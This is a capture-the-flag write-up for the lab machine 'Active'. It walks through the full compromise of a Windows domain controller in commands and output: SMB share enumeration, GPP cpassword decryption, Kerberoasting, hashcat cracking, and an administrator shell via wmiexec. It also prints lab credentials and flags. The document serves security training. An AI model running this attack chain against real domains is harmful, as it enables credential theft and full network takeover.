---
title: Active
os: Windows
difficulty: Easy
points: 20
release: 2017-03-18
---
![](/static/htb/active.png)

# Enumeration

## Nmap

```perl
nmap -sV -sC -p- -T4 --min-rate=1000 10.129.181.42
Starting Nmap 7.93 ( <https://nmap.org> ) at 2025-11-14 11:42 GMT
Nmap scan report for active.htb (10.129.181.42)
Host is up (0.033s latency).
Not shown: 65512 closed tcp ports (reset)

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-14 11:42:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49167/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-11-14T11:43:51
|_  start_date: 2025-11-14T11:21:22
| smb2-security-mode:
|   210:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 92.61 seconds
```

## smbclient

```bash
smbclient -L //10.129.181.4
Password for [WORKGROUP\\root]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
SMB1 disabled -- no workgroup available
```

## smbmap

```bash
smbmap -H 10.129.181.42

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \\    /"  ||   _  "\\ |"  \\    /"  |     /""\\       |   __ "\\
  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)
   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /' /\\  \\     |:  ____/
    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __'  \\    (|  /
   /" \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\
  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     <https://github.com/ShawnDEvans/smbmap>

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.129.181.42:445       Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
        Users                                                   NO ACCESS
[*] Closed 1 connections
```

- **Replication** allows us a read access.

### smbclient - share connect

```bash
smbclient //10.129.181.42/Replication
Password for [WORKGROUP\\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \\> ls
  .                                   D        0  Sat Jul 21 11:37:44 2018
  ..                                  D        0  Sat Jul 21 11:37:44 2018
  active.htb                          D        0  Sat Jul 21 11:37:44 2018

                5217023 blocks of size 4096. 284340 blocks available
smb: \\>
```

- Here, I used a write up as I did not understand why there is nothing there
- It seems to be a replica of SYSVOL, link here: [https://vk9-sec.com/exploiting-gpp-sysvol-groups-xml/](https://vk9-sec.com/exploiting-gpp-sysvol-groups-xml/)
- Interesting from a privesc point of view as Group Policies and the preferences are stored in SYSVOL, which is readable by all authenticated users

```bash
smb: \\> ls
  .                                   D        0  Sat Jul 21 11:37:44 2018
  ..                                  D        0  Sat Jul 21 11:37:44 2018
  active.htb                          D        0  Sat Jul 21 11:37:44 2018

                5217023 blocks of size 4096. 284339 blocks available
smb: \\> RECURSE ON
smb: \\> PROMPT OFF
smb: \\> mget *
getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.4 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Group Policy\\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (1.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (23.3 KiloBytes/sec) (average 9.3 KiloBytes/sec)
getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (8.5 KiloBytes/sec) (average 9.1 KiloBytes/sec)
getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (18.8 KiloBytes/sec) (average 10.4 KiloBytes/sec)
getting file \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (31.1 KiloBytes/sec) (average 14.9 KiloBytes/sec)
smb: \\>
```

- The Groups.xml reads as follow:

```bash
cat active.htb/Policies/\\{31B2F340-016D-11D2-945F-00C04FB984F9\\}/MACHINE/Preferences/Groups/Groups.xml

<?xml version="1.0" encoding="utf-8"?>

<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">

<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">

<Properties action="U" newName="" fullName="" description="" 

cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 

changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\\SVC_TGS"/>

</User>
</Groups>
```

### Password found

- Here we find the name `active.htb/SVC_TGS` and the encrypted password `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

# Foothold

## Group Policy Preferences

- GPP has existed since Windows Server 2008 and allowed admins to modify group and users across their network
- We can now use `gpp-decrypt` to extract the password

```perl
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
                               __                                __
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \\  / _ \\/___// _  / / -_)/ __/ / __/ / // /  / _ \\/ __/
 \\_, /  / .__/ / .__/     \\_,_/  \\__/ \\__/ /_/    \\_, /  / .__/\\__/
/___/  /_/    /_/                                /___/  /_/

[ * ] Password: GPPstillStandingStrong2k18
```

- The domain account TGS_SVC has the password GPPstillStandingStrong2k18

## Authenticated enumeration

- Now that we have valid creds for active.htb, we can enumerate more
- The SYSVOL and Users shares are now accessible

```perl
smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.129.181.42

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \\    /"  ||   _  "\\ |"  \\    /"  |     /""\\       |   __ "\\
  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)
   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /' /\\  \\     |:  ____/
    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __'  \\    (|  /
   /" \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\
  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     <https://github.com/ShawnDEvans/smbmap>

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.129.181.42:445       Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
        Users                                                   READ ONLY
[*] Closed 1 connections
```

- This allows us to get into the Users and get the flag from the Desktop

```perl
smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //10.129.181.42/Users

Try "help" to get a list of possible commands.
smb: \\> ls
  .                                  DR        0  Sat Jul 21 15:39:20 2018
  ..                                 DR        0  Sat Jul 21 15:39:20 2018
  Administrator                       D        0  Mon Jul 16 11:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 06:06:44 2009
  Default                           DHR        0  Tue Jul 14 07:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 06:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 05:57:55 2009
  Public                             DR        0  Tue Jul 14 05:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 16:16:32 2018

                5217023 blocks of size 4096. 284323 blocks available
smb: \\> cd SVC_TGS/Desktop
smb: \\SVC_TGS\\Desktop\\> ls
  .                                   D        0  Sat Jul 21 16:14:42 2018
  ..                                  D        0  Sat Jul 21 16:14:42 2018
  user.txt                           AR       34  Fri Nov 14 11:22:18 2025

                5217023 blocks of size 4096. 284323 blocks available

smb: \\SVC_TGS\\Desktop\\> get user.txt
getting file \\SVC_TGS\\Desktop\\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

- Flag: `a2488721cb49d0d21d632f5388368713`

# Privilege Escalation

- Now that we have the user, we can try using ldapsearch to query fhe Domain Controller for the UserAccountControl attributes of AD accounts, as those hold a lot of security implications
    
- More info on it here: [https://learn.microsoft.com/en-gb/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties](https://learn.microsoft.com/en-gb/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)
    
- The value of 2 corresponds to a diabled account status and so the query below will return active users by SAMAccountName / username in the active.htb domain
    

```perl
ldapsearch -x \\
  -H 'ldap://10.129.181.42' \\
  -D 'SVC_TGS' \\
  -w 'GPPstillStandingStrong2k18' \\
  -b "dc=active,dc=htb" \\
  -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" \\
  samaccountname | grep sAMAccountName
  
sAMAccountName: Administrator
sAMAccountName: SVC_TGS
```

- **`*-s sub*`**The -s option specifies the search scope. sub means a subtree search, including the base DN and all its child entries. This is the most comprehensive search scope, as it traverses the entire directory tree below the base DN.
    
- **`(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2)))`** _is an LDAP search filter to find all user_ _objects that are not disabled._
    
    - Here's the breakdown:
    - _objectCategory=person : Searches for objects in the category "person"._
    - _objectClass=user : Narrows down to objects with a class of "user"._
    - _!(useraccountcontrol:1.2.840.113556.1.4.803:=2) : Excludes disabled accounts._
    - _The `userAccountControl` attribute is a bit flag; this part of the filter excludes accounts with the_ _second bit set (which indicates a disabled account)._
- Aside from the compromised account, we can see that `Administrator` account is also active. Impacket’s [GetADUsers.py](http://GetADUsers.py) tool allows easy enumeration of domain accounts
    

```perl
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.129.181.42
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Querying 10.129.181.42 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 20:06:40.351723  2025-11-14 11:22:20.110136
Guest                                                 <never>              <never>
krbtgt                                                2018-07-18 19:50:36.972031  <never>
SVC_TGS                                               2018-07-18 21:14:38.402764  2018-07-21 15:01:30.320277
```

# Kerberoasting

- Kerberoasting involves extracting a hash of the encrypted material from a Kerberos “`Ticket Granting Service`” ticket reply (TGS_REP), which can be subjected to offline cracking in order to retrieve the plaintext password.
- This is possible because the TGS_REP is encrypted using the NTLM password hash of the account in whose context the service instance is running

- Kerberos authentication uses Service Principal Names (**SPNs**) to identify the account associated with a particular service instance
- `ldapsearch` can be used to identify accounts that are configured with SPNs.
- We will reuse the previous query and add a filter to obtain the SPNs, (serviceprincipalname=_/_) .

```perl
ldapsearch -x \\
  -H 'ldap://10.129.181.42' \\
  -D 'SVC_TGS' \\
  -w 'GPPstillStandingStrong2k18' \\
  -b "dc=active,dc=htb" \\
  -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" \\
  serviceprincipalname | grep -B 1 servicePrincipalName
  
dn: CN=Administrator,CN=Users,DC=active,DC=htb
servicePrincipalName: active/CIFS:445
```

- It looks like the active/Administrator account has been configured with an SPN

```perl
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.129.181.42
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2025-11-14 11:22:20.110136
```

- Now we can use the [GetUserSPNs.py](http://GetUserSPNs.py) as it lets us request the TGS and extract the hash for offline cracking

```perl
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.129.181.42 -request
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2025-11-14 11:22:20.110136

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6b66ef74f47dc571aa43dc1a2f62133e$ef4ee861445a0de54a5c8b5511b938266da2c88881c57e7c879df7e6c222b45e73e7093bfa0cc8f7ec3ee6b7b9b33613d813b64649bd5161ab6750133f82ed4eb47ae4977148e4615935f443e46e71f2adb31c001711540418d63bbb05a9a684409205f06820b22362e2928d27dd243ee1a6f0f3181f74ac5a11e499c66d40a499ac7f18402f2a802f6632625c99f400ae0e082d095f9bc833259fdc5c0efd0d09df5ebeda9e3b079ad8fd9eb392e006c79eb968da6818146818b1567a71ae61feb7114af1febeec960adb33d730000614a6db883c475550405bd1ccb00ca0c67ed0b2fdb202f82e1c4b921ade2d061c774cf7f5e6b36deb10a247baa9377bea98741d3bdd00bfac34ce3b62f4604f8daab27329c87d7b3c1283823dc5ea26248d697370153deaed5c323cc7f5bbd525a545c5cdea6fe96185b72d494a1b038997df23cbd170701ac94ff475b1982bec44aa29be70e85f580576a62c633d276b67b075b78556b4f99f5db8363827e2df8b2ba4873a3f84ec90aa729758341d05df007fe24ffa66dec0887288d219497d1d5817b14dc591b75c3ca0a8f4f2fae33fa7c1d03d2b95c7d81d479c501e9793abd62327d966fea0be0c78cd97b5ed81476fa374ae4140b512885eae62f7238eb125890d1f7d37f61122a66fc73b3f3363faaa3b2900ff4546022ab728cc3777507f268d43878fa157c32634b918b147177a708c902f333fc26584722faaab4181f72c948f2c9f0e01a0ad1288395761926d8dbf2db25a053c56c09fc59fa65cca35e7e8a268cb960ca1da0ff3a74b101754f842db30f9e337ee9f6b2828ad7a087e21e56cd13b5dc6c9b0066c16d4634c4d122941dcca54006be0458a23886f282820b6c9d2e55589b0ca236326f25e805912c5e05d62234a228bf96b59a4fea0452e1854eb51b3560b5c018003656dee5dffca2e51b2ffec1f54fc18c819a1fd0b044c14766d00851e912d1d1d6a73885393b78be78318c120c0aaa22b73c384039aee68d862932f684fdd04f42d3a7ece3b6ffe309ba8df1eaec9cb4b7f17642d481f1f252ae60ceb02305d6cc9a7788f27ce57f57df9ac2c1c0055b88b7406b1dfece667656ed7b00c2ee14e71128a2086c8758763e1a60c0b88bee888f874735e52ee9f821b5963db4679ec8dc824ccde7677be8936eef785756f238cf479770daa161a3baf7f080cfd818a2efcec9d99cfcf6ad5ecc2302dca008fac54745ef98270f4f1b2fb18
```

## Cracking of Kerberos TGS Hash

- We can use hashcat with the rockyou.txt wordlist to crack the hash and obtain the password for the active\administrator
    
- Put the hash in a `hash` file
    
    - type for hashcat will be 13100
    
    ```perl
    hashcat -h | grep TGS-REP
    
    19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
    19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
    13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
    ```
    

```perl
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force --potfile-disable
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
==========================================================================================================================================
* Device #1: pthread--0x000, 2941/5947 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

<SNIP SNIP SNIP as too much text... >

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6b66ef74f47dc571aa43dc1a2f62133e$ef4ee861445a0de54a5c8b5511b938266da2c88881c57e7c879df7e6c222b45e73e7093bfa0cc8f7ec3ee6b7b9b33613d8
13b64649bd5161ab6750133f82ed4eb47ae4977148e4615935f443e46e71f2adb31c001711540418d63bbb05a9a684409205f06820b22362e2928d27dd243ee1a6f0f3181f74ac5a11e499c66d40a499ac7f18402f2a802f6632625c99f400ae0e0
82d095f9bc833259fdc5c0efd0d09df5ebeda9e3b079ad8fd9eb392e006c79eb968da6818146818b1567a71ae61feb7114af1febeec960adb33d730000614a6db883c475550405bd1ccb00ca0c67ed0b2fdb202f82e1c4b921ade2d061c774cf7f5
e6b36deb10a247baa9377bea98741d3bdd00bfac34ce3b62f4604f8daab27329c87d7b3c1283823dc5ea26248d697370153deaed5c323cc7f5bbd525a545c5cdea6fe96185b72d494a1b038997df23cbd170701ac94ff475b1982bec44aa29be70e
85f580576a62c633d276b67b075b78556b4f99f5db8363827e2df8b2ba4873a3f84ec90aa729758341d05df007fe24ffa66dec0887288d219497d1d5817b14dc591b75c3ca0a8f4f2fae33fa7c1d03d2b95c7d81d479c501e9793abd62327d966fe
a0be0c78cd97b5ed81476fa374ae4140b512885eae62f7238eb125890d1f7d37f61122a66fc73b3f3363faaa3b2900ff4546022ab728cc3777507f268d43878fa157c32634b918b147177a708c902f333fc26584722faaab4181f72c948f2c9f0e0
1a0ad1288395761926d8dbf2db25a053c56c09fc59fa65cca35e7e8a268cb960ca1da0ff3a74b101754f842db30f9e337ee9f6b2828ad7a087e21e56cd13b5dc6c9b0066c16d4634c4d122941dcca54006be0458a23886f282820b6c9d2e55589b0
ca236326f25e805912c5e05d62234a228bf96b59a4fea0452e1854eb51b3560b5c018003656dee5dffca2e51b2ffec1f54fc18c819a1fd0b044c14766d00851e912d1d1d6a73885393b78be78318c120c0aaa22b73c384039aee68d862932f684fd
d04f42d3a7ece3b6ffe309ba8df1eaec9cb4b7f17642d481f1f252ae60ceb02305d6cc9a7788f27ce57f57df9ac2c1c0055b88b7406b1dfece667656ed7b00c2ee14e71128a2086c8758763e1a60c0b88bee888f874735e52ee9f821b5963db4679
ec8dc824ccde7677be8936eef785756f238cf479770daa161a3baf7f080cfd818a2efcec9d99cfcf6ad5ecc2302dca008fac54745ef98270f4f1b2fb18:Ticketmaster1968

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...b2fb18
Time.Started.....: Fri Nov 14 12:32:32 2025, (5 secs)
Time.Estimated...: Fri Nov 14 12:32:37 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2170.0 kH/s (1.22ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344384 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10534912/14344384 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiona172 -> Thelink
```

- We have the password: Ticketmaster1968

# Get shell as primary domain admin

- Using impacket’s [wmiexec.py](http://wmiexec.py) to get the root flag

```perl
wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.181.42

Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\\>dir
[-] Decoding error detected, consider running chcp.com at the target,
map the result with <https://docs.python.org/3/library/codecs.html#standard-encodings>
and then execute wmiexec.py again with -codec and the corresponding codec
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\\

14/07/2009  05:20 ��    <DIR>          PerfLogs
12/01/2022  03:11 ��    <DIR>          Program Files
21/01/2021  06:49 ��    <DIR>          Program Files (x86)
21/07/2018  04:39 ��    <DIR>          Users
14/11/2025  02:37 ��    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)   1.143.635.968 bytes free

C:\\>cd Users
C:\\Users>dir
[-] Decoding error detected, consider running chcp.com at the target,
map the result with <https://docs.python.org/3/library/codecs.html#standard-encodings>
and then execute wmiexec.py again with -codec and the corresponding codec
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\\Users

21/07/2018  04:39 ��    <DIR>          .
21/07/2018  04:39 ��    <DIR>          ..
16/07/2018  12:14 ��    <DIR>          Administrator
14/07/2009  06:57 ��    <DIR>          Public
21/07/2018  05:16 ��    <DIR>          SVC_TGS
               0 File(s)              0 bytes
               5 Dir(s)   1.143.635.968 bytes free

C:\\Users>cd Administrator
C:\\Users\\Administrator>dir
[-] Decoding error detected, consider running chcp.com at the target,
map the result with <https://docs.python.org/3/library/codecs.html#standard-encodings>
and then execute wmiexec.py again with -codec and the corresponding codec
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C
 
 Directory of C:\\Users

21/07/2018  04:39 ��    <DIR>          .
21/07/2018  04:39 ��    <DIR>          ..
16/07/2018  12:14 ��    <DIR>          Administrator
14/07/2009  06:57 ��    <DIR>          Public
21/07/2018  05:16 ��    <DIR>          SVC_TGS
               0 File(s)              0 bytes
               5 Dir(s)   1.143.635.968 bytes free

C:\\Users>cd Administrator
C:\\Users\\Administrator>dir
[-] Decoding error detected, consider running chcp.com at the target,
map the result with <https://docs.python.org/3/library/codecs.html#standard-encodings>
and then execute wmiexec.py again with -codec and the corresponding codec
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\\Users\\Administrator

16/07/2018  12:14 ��    <DIR>          .
16/07/2018  12:14 ��    <DIR>          ..
30/07/2018  03:50 ��    <DIR>          Contacts
21/01/2021  06:49 ��    <DIR>          Desktop
30/07/2018  03:50 ��    <DIR>          Documents
21/01/2021  06:52 ��    <DIR>          Downloads
30/07/2018  03:50 ��    <DIR>          Favorites
30/07/2018  03:50 ��    <DIR>          Links
30/07/2018  03:50 ��    <DIR>          Music
30/07/2018  03:50 ��    <DIR>          Pictures
30/07/2018  03:50 ��    <DIR>          Saved Games
30/07/2018  03:50 ��    <DIR>          Searches
30/07/2018  03:50 ��    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   1.143.631.872 bytes free

C:\\Users\\Administrator>cd Desktop
C:\\Users\\Administrator\\Desktop>type root.txt
96d0402de6e9981ac2656cf0bfc22ef0
```

🥂
